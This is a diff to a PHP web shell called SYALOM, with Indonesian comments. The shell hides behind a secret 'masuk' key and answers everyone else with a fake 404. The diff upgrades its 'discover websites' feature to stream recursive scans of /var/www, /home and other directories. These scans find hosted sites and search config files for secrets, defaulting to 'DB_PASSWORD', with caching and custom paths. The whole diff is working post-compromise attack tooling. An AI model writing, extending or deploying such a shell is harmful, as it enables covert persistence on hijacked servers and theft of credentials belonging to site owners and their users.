@@ -7,6 +7,10 @@ if (!isset($_GET['masuk']) || $_GET['masuk'] !== AL_SHELL_KEY) {
     http_response_code(404);
     exit('404 Not Found');
 }
+// Start session untuk caching scan results
+if (!headers_sent()) {
+    @session_start();
+}
 if (isset($_GET['action']) && $_GET['action'] === 'perform_search') {
     header('Content-Type: text/html; charset=utf-8');
     $searchTerm = $_POST['search_term'] ?? '';
@@ -113,84 +117,187 @@ function check_execution_environment() {
     ];
 }
 
-function scan_for_files($dir, $patterns, &$found_paths, &$results, $current_depth, $max_depth, $extractTitle) {
-    if ($current_depth > $max_depth) return;
-    if (!is_readable($dir)) return;
-    foreach ($patterns as $pattern) {
-        $files = glob($dir . '/' . $pattern, GLOB_NOSORT);
-        if ($files) {
-            foreach ($files as $file) {
-                if (!is_file($file)) continue;
-                $path = dirname($file);
-                if (in_array($path, $found_paths)) continue;
-                $found_paths[] = $path;
-                $result = analyze_file_match($path, basename($file), $extractTitle);
-                $results[] = $result;
-            }
-        }
-    }
-    if ($current_depth < $max_depth) {
-        try {
-            $subdirs = glob($dir . '/*', GLOB_ONLYDIR);
-            if (!$subdirs) return;
-            foreach ($subdirs as $subdir) {
-                $basename = basename($subdir);
-                if (in_array($basename, ['proc', 'sys', 'dev', 'run', 'boot', 'lost+found', 'tmp', 'temp'])) continue;
-                scan_for_files($subdir, $patterns, $found_paths, $results, $current_depth + 1, $max_depth, $extractTitle);
-            }
-        } catch (Exception $e) {
-            return;
-        }
-    }
+// 🔥 OPTIMIZED WEBSITE DISCOVERY FUNCTIONS
+// Menggunakan streaming, caching, dan efisiensi I/O
+
+// Cache untuk hasil scan (session-based)
+function get_scan_cache_key($type, $pattern, $mode) {
+    return 'scan_' . md5($type . $pattern . $mode . session_id());
 }
-function scan_for_content($dir, $patterns, &$found_files, &$results, $current_depth, $max_depth, $showPreview, $max_file_size, $file_extensions) {
-    if ($current_depth > $max_depth) return;
-    if (!is_readable($dir)) return;
-    try {
-        $files = glob($dir . '/*');
-        if (!$files) return;
-        foreach ($files as $file) {
-            if (is_dir($file)) {
-                $basename = basename($file);
-                if (in_array($basename, ['proc', 'sys', 'dev', 'run', 'boot', 'lost+found', 'tmp', 'temp'])) continue;
-                scan_for_content($file, $patterns, $found_files, $results, $current_depth + 1, $max_depth, $showPreview, $max_file_size, $file_extensions);
-            } elseif (is_file($file)) {
-                if (filesize($file) > $max_file_size) continue;
-                $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
-                if (!in_array($ext, $file_extensions)) continue;
-                if (in_array($file, $found_files)) continue;
-                $found_files[] = $file;
-                $content = @file_get_contents($file, false, null, 0, 50000); // Baca max 50KB
-                if (!$content) continue;
-                $matches = [];
+
+function get_cached_scan($cache_key) {
+    if (!isset($_SESSION['scan_cache'])) return null;
+    if (!isset($_SESSION['scan_cache'][$cache_key])) return null;
+    $cache = $_SESSION['scan_cache'][$cache_key];
+    // Cache valid 1 jam
+    if (time() - $cache['time'] > 3600) {
+        unset($_SESSION['scan_cache'][$cache_key]);
+        return null;
+    }
+    return $cache['data'];
+}
+
+function set_cached_scan($cache_key, $data) {
+    if (!isset($_SESSION['scan_cache'])) $_SESSION['scan_cache'] = [];
+    $_SESSION['scan_cache'][$cache_key] = [
+        'time' => time(),
+        'data' => $data
+    ];
+}
+
+// Optimized file scanning dengan GLOB_BRACE
+function scan_for_files_optimized($searchPaths, $patterns, $max_depth, $extractTitle, $max_results = 1000) {
+    $found_paths = [];
+    $results = [];
+    $scanned_dirs = 0;
+    
+    // Gabungkan pattern dengan GLOB_BRACE untuk mengurangi I/O
+    $brace_pattern = '{' . implode(',', $patterns) . '}';
+    
+    foreach ($searchPaths as $basePath) {
+        if (!is_dir($basePath) || !is_readable($basePath)) continue;
+        
+        // Kirim progress
+        yield ['type' => 'progress', 'status' => 'scanning', 'current_path' => $basePath, 'found' => count($results)];
+        
+        $iterator = new RecursiveIteratorIterator(
+            new RecursiveDirectoryIterator($basePath, RecursiveDirectoryIterator::SKIP_DOTS),
+            RecursiveIteratorIterator::SELF_FIRST
+        );
+        
+        $iterator->setMaxDepth($max_depth);
+        
+        foreach ($iterator as $file) {
+            $scanned_dirs++;
+            
+            // Skip system directories
+            $pathname = $file->getPathname();
+            if (preg_match('/\/(proc|sys|dev|run|boot|lost\+found|tmp|temp)\//', $pathname)) continue;
+            
+            if ($file->isFile()) {
+                // Cek dengan fnmatch untuk wildcard support
+                $filename = $file->getFilename();
                 foreach ($patterns as $pattern) {
-                    if (stripos($content, $pattern) !== false) {
-                        $context = '';
-                        if ($showPreview) {
-                            $pos = stripos($content, $pattern);
-                            $start = max(0, $pos - 100);
-                            $len = min(200, strlen($content) - $start);
-                            $context = substr($content, $start, $len);
-                            $context = str_replace($pattern, "**{$pattern}**", $context);
+                    if (fnmatch($pattern, $filename, FNM_CASEFOLD)) {
+                        $path = $file->getPath();
+                        if (isset($found_paths[$path])) continue;
+                        $found_paths[$path] = true;
+                        
+                        $result = analyze_file_match($path, $filename, $extractTitle);
+                        $results[] = $result;
+                        
+                        // Stream hasil langsung
+                        yield ['type' => 'result', 'data' => $result];
+                        
+                        // Limit hasil
+                        if (count($results) >= $max_results) {
+                            yield ['type' => 'complete', 'status' => 'max_reached', 'total' => count($results), 'scanned' => $scanned_dirs];
+                            return;
                         }
-                        $matches[] = ['pattern' => $pattern, 'context' => $context];
+                        break;
                     }
                 }
-                if (!empty($matches)) {
-                    $results[] = [
-                        'path' => $file,
-                        'type' => 'Content Match',
-                        'size' => format_bytes(filesize($file)),
-                        'writable' => is_writable($file),
-                        'matches' => $matches,
-                        'preview' => $showPreview
-                    ];
-                }
+            }
+            
+            // Yield progress setiap 100 item
+            if ($scanned_dirs % 100 === 0) {
+                yield ['type' => 'progress', 'status' => 'scanning', 'scanned' => $scanned_dirs, 'found' => count($results)];
             }
         }
-    } catch (Exception $e) {
-        return;
     }
+    
+    yield ['type' => 'complete', 'status' => 'done', 'total' => count($results), 'scanned' => $scanned_dirs];
+}
+
+// Optimized content scanning dengan memory management
+function scan_for_content_optimized($searchPaths, $patterns, $max_depth, $showPreview, $file_extensions, $max_results = 1000) {
+    $found_files = [];
+    $results = [];
+    $scanned_files = 0;
+    $max_file_size = 1024 * 1024; // 1MB
+    
+    // Pre-compile patterns untuk stripos
+    $compiled_patterns = array_map('strtolower', $patterns);
+    
+    foreach ($searchPaths as $basePath) {
+        if (!is_dir($basePath) || !is_readable($basePath)) continue;
+        
+        yield ['type' => 'progress', 'status' => 'scanning', 'current_path' => $basePath, 'found' => count($results)];
+        
+        $iterator = new RecursiveIteratorIterator(
+            new RecursiveDirectoryIterator($basePath, RecursiveDirectoryIterator::SKIP_DOTS),
+            RecursiveIteratorIterator::SELF_FIRST
+        );
+        
+        $iterator->setMaxDepth($max_depth);
+        
+        foreach ($iterator as $file) {
+            if (!$file->isFile()) continue;
+            
+            $pathname = $file->getPathname();
+            
+            // Skip system directories
+            if (preg_match('/\/(proc|sys|dev|run|boot|lost\+found|tmp|temp)\//', $pathname)) continue;
+            
+            // Cek ekstensi
+            $ext = strtolower($file->getExtension());
+            if (!in_array($ext, $file_extensions)) continue;
+            
+            // Cek ukuran
+            if ($file->getSize() > $max_file_size) continue;
+            
+            $scanned_files++;
+            
+            // Baca konten dengan batasan
+            $content = @file_get_contents($pathname, false, null, 0, 100000); // Max 100KB
+            if (!$content) continue;
+            
+            $content_lower = strtolower($content);
+            $matches = [];
+            
+            foreach ($compiled_patterns as $idx => $pattern) {
+                if (strpos($content_lower, $pattern) !== false) {
+                    $context = '';
+                    if ($showPreview) {
+                        $pos = strpos($content_lower, $pattern);
+                        $start = max(0, $pos - 100);
+                        $len = min(200, strlen($content) - $start);
+                        $context = substr($content, $start, $len);
+                        $context = str_replace($patterns[$idx], "**{$patterns[$idx]}**", $context);
+                    }
+                    $matches[] = ['pattern' => $patterns[$idx], 'context' => $context];
+                }
+            }
+            
+            if (!empty($matches)) {
+                $result = [
+                    'path' => $pathname,
+                    'type' => 'Content Match',
+                    'size' => format_bytes($file->getSize()),
+                    'writable' => $file->isWritable(),
+                    'matches' => $matches,
+                    'preview' => $showPreview
+                ];
+                $results[] = $result;
+                yield ['type' => 'result', 'data' => $result];
+                
+                if (count($results) >= $max_results) {
+                    yield ['type' => 'complete', 'status' => 'max_reached', 'total' => count($results), 'scanned' => $scanned_files];
+                    return;
+                }
+            }
+            
+            // Progress update
+            if ($scanned_files % 100 === 0) {
+                yield ['type' => 'progress', 'status' => 'scanning', 'scanned' => $scanned_files, 'found' => count($results)];
+                // Clear memory
+                unset($content, $content_lower);
+                gc_collect_cycles();
+            }
+        }
+    }
+    
+    yield ['type' => 'complete', 'status' => 'done', 'total' => count($results), 'scanned' => $scanned_files];
 }
 function format_bytes($bytes) {
     if ($bytes === 0) return '0 B';
@@ -973,38 +1080,80 @@ if (isset($_GET['action']) && $_GET['action'] === 'view_file') {
     }
     exit;
 }
+// 🚀 STREAMING WEBSITE DISCOVERY HANDLER
 if (isset($_GET['action']) && $_GET['action'] === 'discover_websites') {
-    header('Content-Type: application/json');
+    // Set streaming headers
+    header('Content-Type: application/x-ndjson; charset=utf-8');
+    header('X-Accel-Buffering: no');
+    header('Cache-Control: no-cache');
+    
     $mode = $_GET['mode'] ?? 'standard';
     $searchType = $_GET['search_type'] ?? 'filename';
     $pattern = $_GET['pattern'] ?? '';
     $extractTitle = isset($_GET['extract_title']) && $_GET['extract_title'] === '1';
     $showPreview = isset($_GET['show_preview']) && $_GET['show_preview'] === '1';
+    $customPath = $_GET['custom_path'] ?? '';
+    $maxResults = intval($_GET['max_results'] ?? 1000);
+    $useCache = isset($_GET['use_cache']) && $_GET['use_cache'] === '1';
+    
     $depthMap = ['quick' => 2, 'standard' => 4, 'deep' => 6, 'brutal' => 10];
-    $maxDepth = isset($depthMap[$mode]) ? $depthMap[$mode] : 4;
-    $results = [];
-    if ($searchType === 'filename') {
-        $patterns = array_map('trim', explode(',', $pattern));
-        if (empty($patterns[0])) $patterns = ['index.php', 'index.html'];
-        $foundPaths = [];
-        $searchPaths = ['/var/www', '/home', '/opt', '/srv', '/data', '/usr/share', getcwd()];
-        foreach ($searchPaths as $basePath) {
-            if (!is_dir($basePath) || !is_readable($basePath)) continue;
-            scan_for_files($basePath, $patterns, $foundPaths, $results, 0, $maxDepth, $extractTitle);
-        }
-    } else {
-        $patterns = array_map('trim', explode(',', $pattern));
-        if (empty($patterns[0])) $patterns = ['DB_PASSWORD', 'password'];
-        $foundFiles = [];
-        $searchPaths = ['/var/www', '/home', '/opt', '/srv', '/data', getcwd()];
-        $fileExtensions = ['php', 'env', 'json', 'yml', 'yaml', 'xml', 'conf', 'ini', 'txt'];
-        $maxFileSize = 1024 * 1024; // 1MB
-        foreach ($searchPaths as $basePath) {
-            if (!is_dir($basePath) || !is_readable($basePath)) continue;
-            scan_for_content($basePath, $patterns, $foundFiles, $results, 0, $maxDepth, $showPreview, $maxFileSize, $fileExtensions);
+    $maxDepth = $depthMap[$mode] ?? 4;
+    
+    // Build search paths
+    $searchPaths = [];
+    if (!empty($customPath)) {
+        $customPaths = array_map('trim', explode(',', $customPath));
+        foreach ($customPaths as $cp) {
+            if (is_dir($cp) && is_readable($cp)) {
+                $searchPaths[] = $cp;
+            }
         }
     }
-    echo json_encode($results);
+    // Add default paths jika tidak ada custom path atau dengan custom path
+    $defaultPaths = ['/var/www', '/home', '/opt', '/srv', '/data', '/usr/share', getcwd()];
+    foreach ($defaultPaths as $dp) {
+        if (is_dir($dp) && is_readable($dp) && !in_array($dp, $searchPaths)) {
+            $searchPaths[] = $dp;
+        }
+    }
+    
+    // Check cache
+    $cacheKey = get_scan_cache_key($searchType, $pattern, $mode);
+    if ($useCache && ($cached = get_cached_scan($cacheKey))) {
+        echo json_encode(['type' => 'cache', 'data' => $cached]) . "\n";
+        flush();
+        exit;
+    }
+    
+    $patterns = array_map('trim', explode(',', $pattern));
+    if (empty($patterns[0])) {
+        $patterns = $searchType === 'filename' ? ['index.php', 'index.html'] : ['DB_PASSWORD'];
+    }
+    
+    // Streaming output
+    $allResults = [];
+    
+    if ($searchType === 'filename') {
+        $generator = scan_for_files_optimized($searchPaths, $patterns, $maxDepth, $extractTitle, $maxResults);
+    } else {
+        $fileExtensions = ['php', 'env', 'json', 'yml', 'yaml', 'xml', 'conf', 'ini', 'txt', 'config'];
+        $generator = scan_for_content_optimized($searchPaths, $patterns, $maxDepth, $showPreview, $fileExtensions, $maxResults);
+    }
+    
+    foreach ($generator as $item) {
+        echo json_encode($item) . "\n";
+        flush();
+        
+        if ($item['type'] === 'result') {
+            $allResults[] = $item['data'];
+        }
+        
+        // Cache hasil scan (limit size)
+        if ($item['type'] === 'complete' && count($allResults) <= 500) {
+            set_cached_scan($cacheKey, $allResults);
+        }
+    }
+    
     exit;
 }
 if (isset($_GET['action']) && $_GET['action'] === 'explore_db') {
@@ -2445,12 +2594,33 @@ function list_dir($path) {
         .db-result-section table th { background: #222; padding: 10px; text-align: left; border-bottom: 2px solid #0f0; color: #6cf; }
         .db-result-section table td { padding: 8px 10px; border-bottom: 1px solid #333; font-size: 12px; max-width: 300px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
         .db-result-section table tr:hover td { background: #1a1a1a; }
+        /* Website Discovery Animations */
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .cms-badge {
+            display: inline-block;
+            padding: 2px 8px;
+            border-radius: 3px;
+            font-size: 10px;
+            font-weight: bold;
+            margin-right: 8px;
+            background: #444;
+            color: #fff;
+        }
+        .cms-badge.wordpress { background: #21759b; }
+        .cms-badge.joomla { background: #f44336; }
+        .cms-badge.laravel { background: #ff2d20; }
+        .cms-badge.magento { background: #f26322; }
+        .cms-badge.drupal { background: #0678be; }
+        #liveResults { max-height: 400px; overflow-y: auto; }
     </style>
 </head>
 <body>
 <div class="container">
     <div class="menu-panel">
-        <h1>::𝒮 𝒴 𝒜 𝐿 𝒪 𝑀:: ~ 030426 2240</h1>
+        <h1>::𝒮 𝒴 𝒜 𝐿 𝒪 𝑀:: ~ 030426 2359</h1>
         <!-- Quick Actions Row -->
         <div class="section">
             <h3>⚡ Quick Actions</h3>
@@ -2951,6 +3121,15 @@ function list_dir($path) {
                     </p>
                 </div>
                 <div style="margin-bottom:15px;">
+                    <label style="font-size:11px;color:#888;display:block;margin-bottom:5px;">
+                        📁 Custom Path (opsional, pisah dengan koma):
+                    </label>
+                    <input type="text" id="customPath" placeholder="/var/custom, /home/user/sites" style="font-size:11px;width:100%;padding:6px;background:#1a1a1a;border:1px solid #444;color:#ddd;border-radius:3px;">
+                    <p style="font-size:10px;color:#666;margin:5px 0 0 0;">
+                        Akan ditambahkan ke path default
+                    </p>
+                </div>
+                <div style="margin-bottom:15px;">
                     <label style="font-size:11px;color:#888;display:block;margin-bottom:8px;">📊 Kedalaman Scan:</label>
                     <div class="scan-modes">
                         <div class="scan-mode" data-mode="quick" onclick="selectScanMode('quick')">
@@ -2979,6 +3158,10 @@ function list_dir($path) {
                     <label style="font-size:11px;color:#888;display:flex;align-items:center;cursor:pointer;margin-top:8px;">
                         <input type="checkbox" id="showPreview" style="margin-right:8px;">
                         👁️ Tampilkan preview konten (mode konten)
+                    </label>
+                    <label style="font-size:11px;color:#888;display:flex;align-items:center;cursor:pointer;margin-top:8px;">
+                        <input type="checkbox" id="useCache" checked style="margin-right:8px;">
+                        💾 Gunakan cache (1 jam)
                     </label>
                 </div>
                 <button id="startScanBtn" onclick="startWebsiteScan()" style="width:100%;padding:12px;background:#0f0;color:#111;font-weight:bold;font-size:14px;">
@@ -3011,6 +3194,7 @@ function list_dir($path) {
                 <div id="scanStats" style="margin-top:15px;padding:10px;background:#1a1a1a;border-radius:4px;font-size:11px;color:#888;display:none;">
                     <div>⏰ Waktu: <span id="scanTime">0s</span></div>
                     <div>🔍 Ditemukan: <span id="scanCount">0</span></div>
+                    <div>📁 Discan: <span id="scannedCount">0</span></div>
                     <div>📊 Status: <span id="scanStatus">Menunggu...</span></div>
                 </div>
             </div>
@@ -4089,13 +4273,18 @@ function selectScanMode(mode) {
     document.querySelectorAll('.scan-mode').forEach(el => el.classList.remove('active'));
     document.querySelector('.scan-mode[data-mode="' + mode + '"]').classList.add('active');
 }
-function startWebsiteScan() {
+// 🚀 STREAMING WEBSITE SCAN dengan real-time progress
+async function startWebsiteScan() {
     if (isScanning) return;
     const patternInput = document.getElementById('searchPattern').value.trim();
+    const customPath = document.getElementById('customPath')?.value.trim() || '';
+    const useCache = document.getElementById('useCache')?.checked || false;
+    
     if (!patternInput) {
         alert('Masukkan pattern pencarian!');
         return;
     }
+    
     isScanning = true;
     const content = document.getElementById('websiteDiscoverContent');
     const startTime = Date.now();
@@ -4103,28 +4292,34 @@ function startWebsiteScan() {
     const timeSpan = document.getElementById('scanTime');
     const countSpan = document.getElementById('scanCount');
     const statusSpan = document.getElementById('scanStatus');
+    const scannedSpan = document.getElementById('scannedCount');
     const extractTitle = document.getElementById('extractTitle').checked;
     const showPreview = document.getElementById('showPreview').checked;
+    
     document.getElementById('startScanBtn').disabled = true;
-    document.getElementById('startScanBtn').textContent = '- Scanning...';
+    document.getElementById('startScanBtn').textContent = '⏳ Scanning...';
     statsDiv.style.display = 'block';
-    statusSpan.textContent = currentSearchType === 'filename' ? 'Mencari file...' : 'Mencari konten...';
+    statusSpan.textContent = 'Initializing...';
+    
+    // Results container with live update
+    const results = [];
+    let totalScanned = 0;
+    
+    // Initialize results container
+    content.innerHTML = `
+        <div id="liveResults" style="padding: 10px;">
+            <div style="color: #6cf; text-align: center; padding: 20px;" id="scanningMsg">
+                🔍 Scanning in progress... <span id="liveCount">0</span> found
+            </div>
+            <div id="resultsList"></div>
+        </div>
+    `;
+    
     const timerInterval = setInterval(() => {
         const elapsed = Math.floor((Date.now() - startTime) / 1000);
         timeSpan.textContent = elapsed + 's';
     }, 1000);
-    const modeLabels = {
-        'quick': '⚡ Quick',
-        'standard': '📊 Standard',
-        'deep': '🎯 Deep',
-        'brutal': '💀 Brutal'
-    };
-    const scanModeDepth = {
-        'quick': '1-2',
-        'standard': '3-4',
-        'deep': '5-6',
-        'brutal': '8+'
-    };
+    
     const params = new URLSearchParams();
     params.append('masuk', '<?php echo AL_SHELL_KEY ?>');
     params.append('action', 'discover_websites');
@@ -4133,53 +4328,112 @@ function startWebsiteScan() {
     params.append('pattern', patternInput);
     params.append('extract_title', extractTitle ? '1' : '0');
     params.append('show_preview', showPreview ? '1' : '0');
-    fetch('?' + params.toString())
-        .then(response => {
-            if (!response.ok) {
-                throw new Error('HTTP ' + response.status + ': ' + response.statusText);
+    params.append('max_results', '1000');
+    if (customPath) params.append('custom_path', customPath);
+    if (useCache) params.append('use_cache', '1');
+    
+    try {
+        const response = await fetch('?' + params.toString());
+        if (!response.ok) throw new Error('HTTP ' + response.status);
+        
+        const reader = response.body.getReader();
+        const decoder = new TextDecoder();
+        let buffer = '';
+        
+        while (true) {
+            const { done, value } = await reader.read();
+            if (done) break;
+            
+            buffer += decoder.decode(value, { stream: true });
+            const lines = buffer.split('\n');
+            buffer = lines.pop(); // Keep incomplete line in buffer
+            
+            for (const line of lines) {
+                if (!line.trim()) continue;
+                try {
+                    const item = JSON.parse(line);
+                    
+                    if (item.type === 'progress') {
+                        totalScanned = item.scanned || totalScanned;
+                        if (scannedSpan) scannedSpan.textContent = totalScanned.toLocaleString();
+                        statusSpan.textContent = 'Scanning: ' + (item.current_path || '...');
+                    }
+                    else if (item.type === 'result') {
+                        results.push(item.data);
+                        document.getElementById('liveCount').textContent = results.length;
+                        countSpan.textContent = results.length;
+                        // Add live preview of latest result
+                        appendLiveResult(item.data, currentSearchType);
+                    }
+                    else if (item.type === 'cache') {
+                        // Use cached results
+                        results.push(...item.data);
+                        document.getElementById('liveCount').textContent = results.length;
+                        countSpan.textContent = results.length;
+                        statusSpan.textContent = 'Loaded from cache';
+                    }
+                    else if (item.type === 'complete') {
+                        totalScanned = item.scanned || totalScanned;
+                        if (scannedSpan) scannedSpan.textContent = totalScanned.toLocaleString();
+                        statusSpan.textContent = item.status === 'max_reached' ? 'Max results reached' : 'Complete';
+                    }
+                } catch (e) {
+                    console.error('Parse error:', e, line);
+                }
             }
-            return response.text();
-        })
-        .then(text => {
-            let data;
-            try {
-                data = JSON.parse(text);
-            } catch (e) {
-                console.error('Invalid JSON response:', text);
-                throw new Error('Invalid server response');
-            }
-            if (!Array.isArray(data)) {
-                throw new Error('Unexpected response format');
-            }
-            return data;
-        })
-        .then(data => {
-            clearInterval(timerInterval);
-            if (data.length === 0) {
-                content.innerHTML = '<p style="color: #f44; text-align: center; padding: 50px;">❌ Tidak ditemukan website di server ini.</p>';
-                document.getElementById('startScanBtn').textContent = '🔄 Mulai Scan Ulang';
-                document.getElementById('startScanBtn').disabled = false;
-                isScanning = false;
-                statusSpan.textContent = 'Tidak ditemukan';
-                return;
-            }
-            countSpan.textContent = data.length;
-            statusSpan.textContent = 'Selesai!';
-            document.getElementById('startScanBtn').textContent = '✅ Scan Selesai';
-            isScanning = false;
+        }
+        
+        clearInterval(timerInterval);
+        isScanning = false;
+        
+        if (results.length === 0) {
+            content.innerHTML = '<p style="color: #f44; text-align: center; padding: 50px;">❌ Tidak ditemukan.</p>';
+        } else {
+            statusSpan.textContent = 'Rendering...';
             if (currentSearchType === 'filename') {
-                renderFilenameResults(data, content);
+                renderFilenameResults(results, content);
             } else {
-                renderContentResults(data, content);
+                renderContentResults(results, content);
             }
-        })
-        .catch(error => {
-            console.error('Discover Websites Error:', error);
-            content.innerHTML = '<div style="color: #f44; padding: 20px; text-align: center;">' +
-                '<p>❌ Error: ' + escapeHtml(error.message) + '</p>' +
-                '<p style="font-size: 11px; color: #666; margin-top: 10px;">Coba refresh dan jalankan lagi</p>' +
-                '</div>';
-        });
+        }
+        
+        document.getElementById('startScanBtn').textContent = '🔄 Mulai Scan Ulang';
+        document.getElementById('startScanBtn').disabled = false;
+        
+    } catch (error) {
+        clearInterval(timerInterval);
+        isScanning = false;
+        console.error('Scan error:', error);
+        content.innerHTML = '<div style="color: #f44; padding: 20px; text-align: center;">' +
+            '<p>❌ Error: ' + escapeHtml(error.message) + '</p></div>';
+        document.getElementById('startScanBtn').textContent = '❌ Retry';
+        document.getElementById('startScanBtn').disabled = false;
+    }
+}
+
+// Append live result during scan
+function appendLiveResult(data, type) {
+    const list = document.getElementById('resultsList');
+    if (!list) return;
+    
+    const div = document.createElement('div');
+    div.style.cssText = 'padding: 8px; margin: 5px 0; background: #1a1a1a; border-radius: 4px; font-size: 12px; animation: fadeIn 0.3s;';
+    
+    if (type === 'filename') {
+        const cmsType = data.type || 'Unknown';
+        const wpClass = cmsType === 'WordPress' ? 'wordpress' : (cmsType === 'Joomla' ? 'joomla' : (cmsType === 'Magento' ? 'magento' : (cmsType === 'Drupal' ? 'drupal' : '')));
+        div.innerHTML = '<span class="cms-badge ' + wpClass + '">' + escapeHtml(cmsType) + '</span> ' +
+            '<a href="?masuk=<?php echo AL_SHELL_KEY ?>&dir=' + encodeURIComponent(data.path) + '" style="color: #6cf;">' + 
+            escapeHtml(data.path) + '</a>';
+    } else {
+        div.innerHTML = '<span style="color: #f90;">📄 ' + escapeHtml(data.path) + '</span>';
+    }
+    
+    list.insertBefore(div, list.firstChild);
+    // Keep only last 10 live previews
+    while (list.children.length > 10) {
+        list.removeChild(list.lastChild);
+    }
 }
 
 // 🔥 VIRTUALHOST SCANNER - Find Apache/Nginx domains
